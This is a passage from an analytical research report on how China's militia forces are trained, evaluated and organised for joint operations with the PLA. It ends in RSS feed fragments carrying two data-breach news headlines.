issued by the CMC NDMD and updated every few years. This document identifies the personnel, time, content, and quality requirements for organizing militia training, which focuses on proper politics, military theory, military operations, combat skills, and specialized functional skills. More specific annual militia training plans issued at the provincial and sub-provincial levels work toward the requirements of the MMTO and those set by each superior level in the PMD system, as informed by the needs of PLA theater commands and services. For more detail on the hierarchical militia training system, see . Based on direct descriptions of this document in Chinese military media, the CMC NDMD’s reported priorities, activities within the PMD system in recent years, and other information, the current MMTO likely seeks to promote the following objectives:Ensuring that wartime requirements inform training content and methodsPromoting the integration of technology to support training qualityAchieving a rigorous, realistic combat standardPromoting foundational military skills, specialized skills, and mission operations skillsNormalizing joint training between militia forces and the PLAImproving the quality of militia instructionRaising standards and methods for evaluating trainingInnovating methods for organizing training and assigning standby status for readinessA likely copy of an MMTO from the early 2010s is discoverable online and reveals the general structure of this document. It provides principles to guide militia military training organization and methods; objectives and requirements for training; standards to regulate the time spent in training; clarification on the responsibilities held by each level of the PMD system, military regions (now replaced by theater commands), and PLA services; and standards for evaluating training performance. This copy stipulated that militia training should be led by preparations for military struggle (以军事斗争准备为牵引); focused on key content associated with realistic combat requirements (训用一致; 根据实战需要); conducted using targeted training aimed at specific missions (针对性训练; 针对不同对象，采取不同方法); improved with technology (科技兴训); networked (网络化), simulated (模拟化), and “base-itized” (基地化), referring to the use of MMTBs; and linked (挂钩训练) and joint (联训联演) with active-duty military troops and military academic institutions. However, the copy may be incomplete based on descriptions of even older MMTOs, which likely included details on training content for more than 100 types of .The current MMTO covers the same range of topics and very likely highlights many of the same themes. According to a July 2023 China National Defense News article, the MMTO is an authoritative document that is the basic regulation determining what should be trained and evaluated, and how authorities should go about this work, including in relation to content, personnel, time, and quality. The article particularly references optimizing methods for organizing training, increasing the use of technology in education and training, scientifically pairing methods and content, and rebuilding the training supervision system. A 2025 National Defense Times article refers to a “new outline,” citing grassroots officials in Henan as asserting that edits therein further the realistic combat orientation. This article also suggests the current outline likely calls for innovating training models.The CMC NDMD’s publicly reported priorities and activities likely provide further insight as to the current MMTO’s content. In recent years, the CMC NDMD has likely insisted that militia training implements “war-training unity” (战训一致), uses war to lead training (以战领训), and uses training to promote war (capabilities) (以训促战). The CMC NDMD has likely further emphasized technologically strong training (科技强训) and systemic joint training (体系联训) throughout the NDMS. A member of one CMC NDMD review group tasked with evaluating militia training across six PMDs in late 2024 said that militia forces should “specialize in training what the military forces lack.” The aforementioned CMC NDMD-affiliated interviewees told journalists that authorities should focus on optimizing training content that aligns with the missions and tasks assigned to specific types of militia forces, which includes a requirement to “supplement deficiencies and align [capabilities]” (补差、接口的要求). The CMC NDMD is also likely (almost certainly in some cases) focused on realistic training, joint training, effective evaluation, and organizational innovations, as described below. Also explored below is a tripartite training structure that, while not linked to NDMD activities directly, emerges from available sources as a new approach. Across many of these concepts and goals is an emphasis on resource sharing, which is likely also included in the current MMTO.Notably, many of these themes are not new. Indeed, the focus on using technology was visible as early as 2008, and a “trend toward greater realism” and training with the PLA since the late 1970s or early 1980s. The difference today is likely the emphasis on, the details of, and expectations for rigorous implementation and institutionalization now that China’s leadership has (re)prioritized military preparedness over economic development and emergency response requirements (as noted in the The Goals and Challenges of Militia Construction and Efforts Under the Militia Construction 14th Five-Year Plan sections). A core element of PLA reforms in the last decade has been enabling integrated joint operations (一体化联合作战). Correspondingly, China's military leadership is focused on strengthening the joint operations system and broader efforts to build an integrated national strategic system and capability, of which the NDMS — and therefore militia forces — are a part. As a result, CMC NDMD and PMD-level authorities are likely increasingly insistent that militia training facilitates joint operations with the PLA and others, becomes more realistic to support the PLA’s requirements and the overall wartime orientation of militia forces, and implements innovations around organization and resource sharing to achieve these goals. The current MMTO likely reflects authorities’ anticipation that militia forces will be able to field a credible capability for supporting the PLA’s requirements under the “Centennial Military Building Goal” (建军一百年奋斗目标) by 2027.Achieving Realistic Combat StandardsConducting realistic combat training is almost certainly a central objective of the MMTO. In December 2022, a PLA Daily article asserted that, in recent years, realistic combat training (实案化训练) has become the “basic requirement” of militia training. One question asked by the aforementioned member of a CMC NDMD training review group was reportedly whether activities “meet the real combat standard.” At the start of 2025, the CMC NDMD CPP Committee held an expanded meeting, during which the department’s leadership called for continuing focus within the NDMS (and thus, militia forces) on “realistic combat, practicality, and actual effectiveness” (实战实用实效) in efforts to achieve the 2027 “Military Building Goal.”Authorities are using methodological approaches and technology to increase the realism of militia training. In their methods, authorities are likely attaching importance to competitive and confrontation-style training. The CMC NDMD has reportedly been actively developing mass training competitions, as have subordinate authorities within the PMD system. The Anhui PMD’s 2025 annual training plan reportedly calls for realistic case confrontation training (实案化对抗训练) in alignment with the “spirit” of an expanded meeting held by the CMC NDMD and Eastern Theater Command CCP Committee. Whether the frequency of such training is increasing is unclear, but red-blue drills (that is, drills which pit a “red” force against a “blue” force in simulated confrontation) are a way this is achieved. For example, in 2023, the Fujian PMD organized air defense  for red-blue confrontation live-fire training. In June 2025, local authorities in Henan conducted a red-versus-blue drill involving teams of intelligence reconnaissance forces using drones and signals intelligence to discover their opponent’s location over efforts (such as decoys) to prevent discovery. According to these authorities, this training followed the current MMTO in part by exploring nighttime training — which has been in previous outlines but implementation of which was reportedly limited and outdated.Another method highlighted in Chinese military media is “no contingency plan” (for example, 不设预案) or “no script” (for example, 无脚本) training. This method likely refers to training in which militia personnel are not told beforehand the specific situations they will face or precise tasks to be performed, creating a test of readiness, skill, adaptability, and “on-the-spot” (临机) decision-making in contrast to “formulaic” (程式化) approaches. For example, one MSD in Guizhou has reportedly reformed its live-fire militia artillery drills by eschewing fires from pre-determined “ideal distances,” “ideal positions,” and “ideal angles” and using “no script,” “no plan,” and “on-the-spot” methods. Authorities have used this method since at least 2006, but some recent reports suggest adoption may be spreading with language like “exploring the new path of responding to emergencies and responding to war under the condition of having no contingency plan.”Technologically, VR and simulation are pursued as important enablers of realistic, effective, and confrontation-style training, as seen in the aforementioned examples of MMTB modernization. The VR system at Xinjiang Production and Construction Corps Second Division’s MMTB can simulate more than twenty scenarios and is used to support normalized “realistic combat confrontation training.” One provincial-level “militia tactics simulation training center” can reportedly simulate 28 “classic” operations, including urban counter-terrorism and maritime search and rescue. A county in Jiangxi is using VR and simulation platforms to conduct individual training and coordinated training (协同训练) in transportation protection and engineering repair, as well as confrontation training under scenarios such as enemy sabotage of a rail bridge. Zhejiang PMD authorities have also organized district-level militia instructor training using a simulation platform for red-blue offense-defense confrontation drills. In addition to offering an (at least visually) immersive experience, these technologies are valued for enabling training in more risky subjects, keeping costs low, and overcoming other obstacles like limited access to equipment. How widespread VR and other technologies (like augmented reality) are is unclear. There are likely financial and technical considerations that would impact the ability of some jurisdictions to deploy these solutions.Building Foundation, Special, and Mission SkillsOne relatively new facet of the current MMTO likely relates to a tripartite structure for militia training. Although not directly linked to CMC NDMD activities, Chinese military media and local government documents reveal there are three types of instruction that all types of militia receive per the current MMTO. These are “common foundation” (共同基础), “specialized skill” (专业技能), and “mission operations” (任务行动) training. One annual training plan issued by a county-level jurisdiction in Inner Mongolia likely exemplifies the basic concept: the jurisdiction’s militia emergency response forces, specialized forces (including a communications support company), and special forces (namely, a cyber militia platoon for public opinion and propaganda) each received twelve days of training, with three days focused on the “common foundation,” four days focused on specialized skills, and five days focused on mission operations. Common foundation training includes instruction on individual tactics, light arms shooting, grenade throwing, first aid, and camouflage and protection. The first two examples in  likewise show that cyber militias receive common foundation and specialized training. Other unique forces, such as maritime militias in Hainan also train under this structure.Authorities very likely adopted this tripartite training approach within the last decade, possibly as part of the MMTO issued in 2018 It does not appear in the likely early 2010s MMTO copy, but is referenced in local government sources and Chinese military media at least as early as 2017 and 2018. References to common foundation training and mission operations training in sources that also mention militias particularly appear to increase in 2019, suggesting their use likely started to become more common around this time (see ).Number of local government yearbooks, academic publications, and other sources that reference both militias and common foundation training or mission operations training, 2000-2025; results are likely not exhaustive, and the query structure is imprecise because sources that mention militias could be referencing these training approaches in relation to other forces (Source: Held by Recorded Future)MMTB construction plan from Liping, Guizhou; fields are designated for shooting, grenade throwing, and camouflage and interference training (which constitute common foundation training), mission operations training, and likely specialized training for engineering support, firefighting and relief, flood prevention and rescue, and health and protection(Source: Held by Recorded Future)Training to Support Joint OperationsOf particular importance is the CMC NDMD’s work to normalize joint training and joint exercises between militias and the active-duty armed forces. The goal is to advance the deep integration of militia training with the joint operations training system (联合作战训练体系) so that, ultimately, authorities can mobilize these forces to effectively support joint operations in all domains. This project likely entails top-down changes to the militia system to enhance coordination between the PMDs, military services, local CCP committees, and government and party departments; clarify responsibilities; optimize resource allocation; and improve operating mechanisms. In 2022, the deputy secretary of the Tianjin Garrison CCP Committee described the joint training architecture this way: theater commands write militia mission operations training into the training system to coordinate joint training and exercises with key militia forces; PLA services lead linked and joint training to strengthen their command and coordination with militias; and the PMD system focuses on developing the specialized skills and command skills of militia personnel and the capability of  to act as cohesive units (成建制).The frequency of joint training is unclear — and will likely vary across localities, theater commands, and  functions — but compared to the early 2000s, implementation of the related “linked training” concept is likely evolving from sporadic and situational to more institutional. Military-local joint exercises throughout the Hunan PMD are occurring on a regular schedule. One MSD in Hunan reports that its PLA service support militia  train with the PLA “every year.” At least one county-level PAFD in Henan has ensured joint training with militias is written into the annual training plans of locally garrisoned troops. Prior to 2016, Hainan authorities were already convening meetings involving military, law enforcement, and civilian forces no less than twice annually, in part to organize joint defense drills. Linked and joint approaches are also enabling militia forces to train using PLA equipment, facilities, and other resources (for example, instructors and teaching materials) to facilitate their development. In at least some training events, active-duty PLA and militia personnel are reorganized into mixed units. Key PLA service support militia  may be directly integrated with their PLA counterparts for some training.Examples of joint training between the militia and PLA include:In an unknown year, militia  from Shandong reportedly participated in at least one Northern Theater Command joint air defense drill, in which they engaged in radar camouflage, optoelectronics confrontation (光电对抗), and other activities under a complex electromagnetic interference environment.In June and October 2023 and November 2024, the Eastern Theater Command Air Force organized daytime and nighttime joint bomb disposal and runway repair exercises with militia forces.In January 2025, the Jiangxi PMD organized a “supporting forces conducting mobile operations” drill, during which active-duty “officers and soldiers,” militias, and national defense mobilization support teams exercised for motorized maneuver, mitigating enemy reconnaissance and harassment, and establishing comprehensive support points.In January 2025, maritime militia forces likely supported the Eastern Theater Command’s “Strait Thunder-2025A” joint training drill as part of forces exerting “key area and chokepoint control” east and west of Taiwan. In May 2024, maritime militia forces aided the China Coast Guard (another component of China’s armed forces under the PAP) in an inspection and boarding drill near Taiwan in conjunction with Eastern Theater Command’s “Joint Sword 2024A” exercise.In June 2025, an element of the PLA Rocket Force organized militia forces for joint training to improve aligned assistance and support capabilities using an approach in which forces mobilized from different PAFDs were assigned to specialize in different tasks. Publicly reported areas of focus included logistics, road repair, and first aid. Eastern Theater Command Rocket Force has previously organized militia training that simulated nighttime firing of the Dongfeng-11 (DF-11) short-range ballistic missile.Likely under the objectives of crafting an integrated national strategic system and capability and strengthening with wider NDMS, advancing jointness expands beyond militia engagement with the PLA to include joint training that involves militia and various other military, non-military, and national defense mobilization forces. This also includes working to develop jointness between different  and local commands under the PMD system (for example, county-level PAFDs). Supporting militia training through other local resources (such as the resources of hi-tech enterprises) is also a priority. Authorities in Jiangsu are, for instance, turning to enterprises to provide cyber offense-defense environments for militia training. Other examples of these trends include:In June 2021, the Sansha Garrison organized island and reef militia forces for common foundation training and specialized training at a PLA Navy base, with some instruction delivered by PAP personnel.Likely in 2023, authorities in Anhui conducted joint training and evaluation that involved militia, public security, and civil air defense forces cooperating to repair a radar communications station. Civil air defense personnel provided video command, communications (集群对讲), and signals interference; militia forces repaired damaged radar station “lines"; and public security forces organized counter-UAV defenses.In December 2024, the Chongqing Garrison organized a six-day national defense mobilization joint drill and evaluation involving more than 1,000 militia personnel from twelve subordinate districts and counties that (during at least part of the training) formed combined arms groups (合成化编组), where specialized forces were the backbone and emergency response forces the main body.In February 2025, authorities in Sichuan organized a training in which militia technical backbone personnel and local technical experts cooperated to develop comprehensive communications support capabilities using equipment from a local communications company. The training particularly involved setting up network links and establishing a satellite base station, followed by a red-blue confrontation drill.In July 2025, authorities in Shanxi organized joint training among the PAP provincial  (武警山西省总队), special police (特警), and militia forces that focused on controlling and mitigating a bomb threat. The militia supported mitigation efforts by quarantining the surrounding area and inspecting nearby persons while other forces worked to identify the origin of the threat.Improving the quality of instruction that militia personnel receive is another line of effort that seeks to benefit from jointness. Likely since 2023 and under the CMC NDMD’s direction, authorities are conducting “militia military training teaching methods demonstration month events” (民兵军事训练教学法示范月活动) that promote cross-jurisdiction exchanges to improve the quality of militia instructors and other key personnel. During the 2024 events, the CMC NDMD “actively explored” tiered training for militia instructors such that the NDMD was responsible for “demonstration subjects” (示范课目), the PMDs responsible for “key and difficult subjects” (重难点课目), and MSDs responsible for “standardized subjects” (范化课目). For example, PMDs organized training in the use of meteorological observation equipment while MSDs organized training for rifle handling and operating a ship. Although how frequently the NDMD itself organizes such training is unclear, demonstration month events are a recurring approach to raising training quality. The CMC NDMD is also guiding PLA theater commands to engage with key militia instructors through on-site exchanges and mutual research during these events. In one 2024 demonstration month event, the Hunan PMD organized training for more than 380 militia instructors from subordinate MSDs and six other provincial-level jurisdictions, with representatives from a special warfare  of the Hunan PAP on-site for exchanges. provides additional examples of joint training and engagement between cyber militias and other military and non-military forces and resources.Evaluating Performance with AccuracyThe CMC NDMD is likely making efforts to increase the rigor of militia training evaluation procedures. The CMC NDMD and every PMD have reportedly insisted on making proper training and evaluation (端正训风考风) a project of the CCP committee (党委工程) and the officers (主官工程). This language suggests an increasing expectation that sub-national authorities be highly attentive to achieving effective militia training and accurate evaluation of that training. More concretely, the CMC NDMD has reportedly “made a systematic deployment” (作出系统部署), “revising and improving” assessment methods, building a system of capability indicators, and conducting capability inspections and evaluations. The basic approach under the current MMTO is likely “train one, evaluate one; qualify one, and train again” (训完一个考核一个，合格一个再训一个), where “one” likely means a training subject (though this is not specified). The CMC NDMD is also regulating training standards and likely pushing the militia system to normalize supervision of training.Authorities are using technology to support this work. At least in some jurisdictions, technical means are tracking training attendance, generating assessment results, and offering a clear view of mission execution. According to the leadership of the Guizhou PMD War Preparation Construction Bureau, the simulation systems used to achieve realism also provide “capability portraits” that assign numerical scores to skill categories like monitoring and early warning, analysis and judgment, tracking and tracing, and coordination and cooperation. There are further calls to establish a “specialized capability certification system” aligned to national vocational qualification standards, which at least one province has done. Jiangsu authorities are issuing militia “one expertise, many skills” certifications for eight positions, including UAV operator and network engineer.Corresponding to the wider emphasis on jointness, there is reportedly a requirement to establish an integrated joint evaluation (一体化联合考评) mechanism. In one conception of this, written in the context of strengthening PLA service support militia  specifically, the PMD system focuses on evaluating common foundation training outcomes along the existing administrative hierarchy, while the PLA services are mainly responsible for evaluating the development of specialized skills with organizational support from the PAFDs. Training performance outcomes are written into the annual quantitative management targets of the MSDs and PAFDs. Evaluations cover, through separate assessments, the mission operations capability of  acting as units (成建制) and their ability to act jointly with active-duty forces.A cyber militia network equipment maintenance fendui undergoes final assessment after centralized training organized by PMD authorities, likely at the Hunan University of Science and Technology’s School of Computer Science and Engineering (计算机科学与工程学院) (Source: Held by Recorded Future)Organizing to Sharpen ReadinessThe current MMTO likely directs authorities to optimize methods of organizing militia forces to undergo training. The aforementioned CMC NDMD-affiliated interviewees highlighted the importance of innovating training organization in their summary of where authorities should focus their attention, such as by differentiating groups based on qualities and identities, conducting cross-regional joint training for small specializations (新小特专业跨区域联训), and conducting cross-regional centralized joint training (跨区域集中联训). In one innovation emphasized by Chinese military media, authorities seek to improve year-round militia readiness by pairing cyclical annual training with a “standby” status. However, many militia personnel likely do not receive training each year. Authorities are also pursuing “centralized” and “distributed” training methods to account for common foundation training requirements, the demands of specialized skillsets, and other challenges.  further discusses approaches to organizing training under the PMD system’s hierarchical structure.The core of the militia training regime is annual “centralized training” (集中训练), also called “intensive training” (集训), which involves a group of personnel assembled for multi-day instruction in common foundation skills, specialized skills, and mission operational skills. The MMTO sets general time requirements for training based on the types of personnel and forces to be trained, as well as other factors (see ). In general, militia personnel today may be commonly expected to undergo seven to twelve days of core training annually. This likely does not include additional time spent in evaluations, certain drills, and other activities. Militia forces also undergo annual evaluations and skill-specific evaluations, get called up for inspections, join mission drills and joint drills with the PLA, receive supplemental training, participate in arms competitions, and compete in capture-the-flag events in the case of cyber militias. Sometimes evaluation and training occur at MMTBs, and at other times take place in unfamiliar terrain.The cyber offense-defense fendui of the Jilin MSD participates in a cyber offense-defense specialized skills competition and centralized training at a local vocational school (Source: Changbai Bing Ge)The trend for several decades has been toward consolidation of centralized training, particularly through the use of county and city-level MMTBs under the concept of “base-itization.” One likely increasingly common approach since approximately 2018 to organizing forces for centralized training is “rotation training and standby” (轮训备勤; RT&S) or “centralized” RT&S at MMTBs. In this approach, batches of personnel (分批) are trained at different periods (分期) throughout the annual training cycle. For instance, an MSD in Jiangxi once divided the primary militia organized by more than 340 grassroots PAFDs under its jurisdiction into twelve batches and trained one batch per month. Note that at least some local authorities in China were doing batch training like this by the 1990s. What has likely changed is the breadth of adoption in recent years and emphasis on the “standby” concept, as well as the relationship between “standby,” “rotation training,” “centralized training,” and “base-itized” training.
         shows that references to RT&S-related concepts have likely emerged largely since 2018, in contrast to more common and general concepts like “rotation training” and “standby.” For example, only 47% of over 7,000 sources referencing militias and rotation training since 2000 were published in or after 2018, likely indicating the commonality of this concept prior to that year. In contrast, 87% of 1,003 sources referencing militias and RT&S were published in or after 2018, likely indicating its more recent adoption post-reform.Authorities are pursuing the RT&S approach to improve year-round militia readiness. According to statements by the leadership of one MSD in Jiangxi, RT&S integrates training and use and ensures that militia forces can be called up and effectively employed when there is a need. The approach is linked to the goal of achieving “normal state standby” (常态备勤) among militia forces. Chinese military media coverage highlighting how authorities are implementing RT&S refer to a new organizational system (体制) intended to support this effect. For instance, some authorities are categorizing forces into normal state standby , emergency response reserves , and war readiness duty  (战备值班分队). Under this or similar models, the annual training period is likely a given ’s period to be on standby for deployment. Some authorities are likely considering additional factors, like anticipated tasks in a given season, when assigning standby status. In 2020, the commander of an MSD in Hunan called for a readiness level classification (分级战备) method, in which the last, current, and next batch of militias to be called up for rotation training come into and fall out of readiness status. In practice, the next batch of forces would likely be considered to have low readiness since they would have gone the longest without training.Despite the apparent focus on readiness, many (possibly most) militia forces likely do not undergo training every year. The likely early 2010s copy of the MMTO only required training for a fraction of militia forces (see ). There is a concept of “full personnel coverage” (全员覆盖) or “all personnel participate in training” (全员参训) likely linked to the RT&S approach, which may suggest this expectation is changing, but the concept’s meaning is unclear. One interpretation is that all enlisted militia personnel in a given jurisdiction are trained each year. In 2018, an MSD in Hebei celebrated that its “primary militia training participation rate reached 100% per regulations.” However, some local government documents issued in and after 2018 continue to indicate that training tasks are only assigned to a portion of available forces. For example, one 2024 document indicates a Heilongjiang county should maintain the size of its primary militia at 460 personnel, but the “annual basic training task” only covers 104 people. A 2021 document indicates that a Shandong district has 48  of various types that comprise nearly 2,000 personnel, yet only 302 personnel are designated for training. References to “all personnel” in sources that also mention militias have been rising since the early 2000s, but there is no clear increase in usage that occurred around 2018. Ultimately, definitive conclusions about what this stipulation means and its novelty remain elusive as of this writing.Despite the trend toward consolidation and use of MMTBs, there are nuances to how authorities organize militia training for different subjects. These nuances likely primarily serve to accommodate the development of highly specialized skill sets and other challenges associated with mustering civilian professionals for extended periods. The overarching concept is likely that common foundation subjects, emergency response subjects, and general use specializations use centralized training methods, more niche specialized skills and special forces — including  for cyber offense-defense and frequency spectrum management — use what is called “distributed training” (分散训) or “separate training” (分开练), and mission operations training relies “joint training” (联合训). One 2021 county-level document identifies a range of these methods, including the stipulation that mission operations training should rely on participation in PLA theater command exercises and the drills of military and local government authorities at all levels. Other methods also exist; in one case, the personnel of an engineering repair  were assigned to work at a "roadway and bridge” enterprise for four months to develop specialized skills. See  for additional examples of centralized and distributed approaches to training among cyber militias.Additionally, there are likely nuances MMTBs authorities use for training. For example, the commander of Guilin Garrison in Guangxi has promoted this pattern for ensuring training quality: common foundation training relies on nearby MMTBs for cooperative training (合训), specialized training relies on training bases (not necessarily MMTBs) with the relevant capabilities for overall training (统筹集训), and mission operations training relies on regions where future operations may occur or PLA service training bases for joint training (合演训).Assessments of Progress in Militia ConstructionThe CMC NDMD likely assesses positive progress throughout both the militia force and the wider NDMS within which they sit. This national-level authority assessed “steady” improvement in NDMS capabilities in 2022 and a “significant leap” in 2023. In late 2024 and early 2025, CMC NDMD-affiliated personnel, speaking with China Militia journalists for various news articles, said that authorities have “comprehensively improved the capability for all levels and all types of personnel to carry out diversified tasks,” as well as:Begun correcting “problems such as sluggish and loose militia training," in part by introducing more competition in the system to "arouse passion for combat"Gradually solved the “old big difficult” problem of insufficient training facilitiesPersisted in advancing the transformation and upgrade of military trainingDone a good job in intensifying the organization of training (组训), using specialized instruction (专长化任教) and simulated training methods, and in standardizing evaluations“Actively consolidated” results from the “militia military training teaching methods demonstration month events”Improved conditions related to militia training expenses and access to equipmentContinuously strengthened new-quality force constructionChinese military media journalists further assert (in their reports documenting activity throughout the militia system, but not attributed to comments from CMC NDMD-affiliated individuals) that authorities have “initially achieved” the transformation from “large”-to-”elite” and developed stronger “bones and muscles"; improved the alignment of militia requirements with skilled personnel, with recruitment of veterans, CCP members, and high-quality talents increasing; standardized the “shape” of militia forces, with emphasis being placed on organization in large- and medium-sized cities, all types of enterprises, development zones, and emerging domains; rectified problems like repetitious organization; worked to emphasize the abilities of  to carry out missions as cohesive units (成建制) rather than the quality of individual soldiers; established a “new model” at every level of the PMD system for militia training that is joint with the PLA, facilitated by military academic experts, and makes use of local resources; enlarged training that assists and supports war; and made progress improving militia forces’ access to advanced equipment. Journalists observe that after a series of intensive efforts to normalize training supervision work, correct lenient and unrealistic training styles, and rectify other problems, the “training situation has reversed"; the quality and effectiveness of militia basic training have steadily increased; and mechanisms for supervision, punishment, and reward are more robust.At the same time, it is still common for Chinese military media to report that authorities have assessed significant shortcomings among their militia forces. For example, while assessing their national defense mobilization capabilities in late 2024, the Fujian PMD found deficient ability among militia cadres to lead forces in executing missions and lax training unfit for the requirements of war. In mid-2025, a county-level PAFD in Guangdong organized an investigation into realistic combat training and the conduct of diversified military tasks, finding major problems that were constraining local militia forces’ capabilities.As indicated in the , the foregoing assessments in Chinese military media are credible but not necessarily authoritative. While statements attributed to CMC NDMD-affiliated individuals are somewhat more credible and more likely reflective of actual viewpoints within the CMC NDMD than observations made by journalists, all Chinese military media content is very likely influenced (at least to some extent) by political factors and propaganda objectives. For different pieces of media, objectives likely include stoking domestic enthusiasm for militia work, driving greater effort among authorities implementing reforms, or generating international deterrence effects by portraying militias as increasingly effective. This can likely lead to instances in which the weaknesses of militia forces are overstated or their strengths exaggerated.China’s militia forces are likely developing a credible capability for supporting the PLA in future conflicts, but slowly and likely unevenly. Progress toward authorities’ goals almost certainly continues to face obstacles posed by local budget constraints, bureaucratic inattention, and the contradictions inherent to cultivating nationwide military capabilities within the civilian (including private) economy. Development is likely also to be uneven across localities because certain jurisdictions, such as those near potential conflict zones, likely face greater pressure to improve militia readiness. The slow pace of reform is clear in the observable history: a government white paper published in 2013 highlighted efforts to improve militia structure, equipment, and training — areas in which notable challenges remain more than a decade later.There are also specific indications that incomplete implementation and missed deadlines hinder today’s objectives. It appears that not all provincial-level jurisdictions have passed a militia benefits package as directed by the CMC NDMD. Five years since militia forces were likely supposed to have “gotten strong,” that development goal has not changed. If the intended effect of the aforementioned “all personnel” concept is to ensure all militia forces receive training each year, this is another area where implementation is facing challenges. Other problems also remain; the rotational training format continues, for instance, to rely on short training periods and long annual cycles, which can negatively affect force capabilities, especially when the force is organized inefficiently.Still, pockets of excellence are likely emerging, especially in domains where militias can put their skills to use during peacetime. In cyberspace, these pockets of excellence include cyber militias at the cybersecurity companies Qihoo 360 and Antiy. In the maritime domain, the Sansha maritime militia and others have actively contributed to enforcing China’s claim over the South China Sea for more than a decade. The “interoperability and integration” of these maritime militia forces are growing “in scale and sophistication,” according to a 2024 assessment by the United States Department of Defense. Of course, no militia has wartime experience; whether this part-time component of China’s armed forces will function effectively under such pressure remains unknown.More important than the capabilities of China’s militia forces today is the implications of their reorientation toward wartime requirements, the issuance of the MC 14th FYP, legal reforms to improve the benefits of participating in militia construction, and signs of other reforms since 2018: an increasing focus on systematically improving this component of China’s armed forces. National military and civilian authorities have begun taking necessary steps to guide and support the militia system in overcoming longstanding challenges to recruiting and training an effective force. The elevation of militia work into its own 14th FYP and the coordinated push to pass measures addressing the concerns of militia personnel and the entities (for example, enterprises) in which they are organized provide the clearest indication of this.Recent evolutions in the militia system should prompt governments, militaries, and national security-focused analysts to begin monitoring (or intensify current monitoring of) militia work in China. Specifically, this analysis should focus on whether militia forces in areas relevant to potential conflicts are starting to outgrow the common understanding of them as neglected, ill-equipped, poorly trained, and primarily oriented toward non-war missions like peacetime social stability. These and other challenges will almost certainly remain relevant to right-sizing China’s militia forces (the capabilities of which Chinese military media may exaggerate, as noted above), but their development is an important aspect of Xi Jinping’s efforts to strengthen China’s armed forces. Thus, these problems may become relevant to a diminishing proportion of forces over time. Growing emphasis on correcting militia deficiencies must be considered when evaluating China’s total military strength relative to that of other countries, as well as China’s ability to mobilize society in support of a war effort. Militia forces likely have the potential to provide a numerical and structural advantage in some domains, such as cyberspace.Major changes in the level of attention, investment, and time devoted to militia work — such as a confirmed shift to training all militia personnel annually or indications that time spent in training is increasing — can likely serve as a warning indicator about China’s intentions with regard to Taiwan, as authorities would very likely mobilize militia forces to contribute to any future war. This is particularly the case with militia forces in jurisdictions that are most relevant to a Taiwan scenario, like Fujian. Prior to China’s invasion of Vietnam in 1979, militia forces in Yunnan and Guangxi were built up, which reportedly entailed exchanging old weapons for new, undergoing intensified training, and deploying to the border (particularly logistics forces). Changes to militia force posture in areas like Hainan province or Sansha City are likely similarly relevant to assessing risks in the South China Sea.Authorities are currently formulating China’s 15th FYP. A new iteration of the militia construction plan will likely run from 2026 through 2030. It will likely entail continued emphasis on passing regulations to guarantee militia rights and benefits, upgrading MMTBs, and financing militia force development. A key question is whether the development stage will change; if authorities begin moving away from the “getting real” to “getting good” and “getting strong” formulation, it will likely (depending on the rhetoric used) indicate substantial progress in improving militia training and war preparedness. Given the geographic and functional complexity of the militia system, continued research on specific forces would further refine understanding of China’s reserve military capabilities.Appendix A: The Militia Training HierarchyMilitia training is primarily organized under the four-tier hierarchy of the PMD system. According to “China’s National Defense in 2008” (a government-issued white paper), the PMDs are the backbone, MSDs are the main body, county-level PAFDs are the foundation, and grassroots PAFDs are supplemental. Authorities continue to use this hierarchical approach, though the specifics have likely evolved as they seek greater efficiency and better outcomes — authorities have discussed how to “improve” this tiered arrangement since at least 2017. The hierarchical system is also involved in evaluating outcomes at lower levels. As of 2025, Chinese military media alludes to this pattern of tiered training and supervision work: one level is observed by another, one level leads another (一级做给一级看、一级带着一级干). The CMC NDMD serves as a fifth tier, inspecting training performance across PMDs and, in some cases, organizing training.According to a 2013 description of training responsibilities, the PMDs mainly provide training for new PAFD leadership, militia air defense missile , “a portion” of specialized technical backbone personnel for which organizing training is challenging, and militia instructors; the MSDs mainly provide training for anti-aircraft artillery, communications, engineering, anti-chemical and other specialized technical ; and the county-level PAFDs mainly provide training for ground artillery, emergency response, infantry, and aligned specialization .The essential elements of this approach remain true today, with a division of labor based on roles, resources, and expertise. For example, in 2021, the Inner Mongolia PMD took responsibility for organizing jurisdiction-wide UAV operators, militia instructors, and the backbone forces of the border defense cavalry militia. Per Heilongjiang’s militia work regulations (last updated in 2018), county-level PAFDs are primarily responsible for militia military training. However, PAFDs and their superior MSD can jointly conduct training for challenging specialized technical subjects. During “militia military training teaching methods demonstration month events” in Chongqing, the provincial-level garrison command provides militia instructor “training, evaluation, and arms competitions” each year, while directly subordinate (that is, likely MSD-level) PAFDs organize “general training and evaluation (普训普考) and implement specialized instruction (专长化任教). This pattern likely aligns with the distribution of responsibilities during demonstration month events as led by the CMC NDMD in 2024 (see Training to Support Joint Operations).A 2018 China National Defense News article on innovating training organizational approaches emphasized the following pattern to facilitate jointness and mitigate training that is overly focused on local missions. County-level PAFD train emergency response  and militia forces with “ordinary” specializations, which afterward undergo centralized joint training at superior-level “training centers"; technical  that are not highly specialized are trained at the MMTBs of their current level using the “big specialization, small centralization” (大专业小集中) and “small specialization, big centralization” (小专业大集中) methods; and superior levels provide unified training for highly specialized technical forces. The article further calls for “exploring” a two-level method in which PAFDs organize foundation training (基础训练) for “small specializations” while MSDs organize training for “big specializations” and the personnel of militia special forces (for example, cyber militias).Other significant reforms may be occurring. For example, authorities in Yueyang, Hunan, have stripped PAFDs of their responsibilities to implement militia training because insufficient facilities and instructors greatly impacted training quality. These PAFDs now only muster and manage militia personnel, while the MSD provides unified training and evaluation. However, this may be an isolated case.It is unclear how this hierarchical structure accommodates “distributed training” formats such as in-place training at enterprises (see the Organizing to Sharpen Readiness section), though authorities continue to supervise forces using these formats (see  for an example).Appendix B: Militia Rights and Benefits Policy Rollout]]></content:encoded></item><item><title>US company with access to biggest telecom firms uncovers breach by nation-state hackers</title><link>https://databreaches.net/2025/10/29/us-company-with-access-to-biggest-telecom-firms-uncovers-breach-by-nation-state-hackers/?pk_campaign=feed&amp;pk_kwd=us-company-with-access-to-biggest-telecom-firms-uncovers-breach-by-nation-state-hackers</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 29 Oct 2025 21:36:34 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Canada says hacktivists breached water and energy facilities</title><link>https://databreaches.net/2025/10/29/canada-says-hacktivists-breached-water-and-energy-facilities/?pk_campaign=feed&amp;pk_kwd=canada-says-hacktivists-breached-water-and-energy-facilities</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 29 Oct 2025 21:36:20 +0000</pubDate><source url="https://databreaches.net/">Recent Data 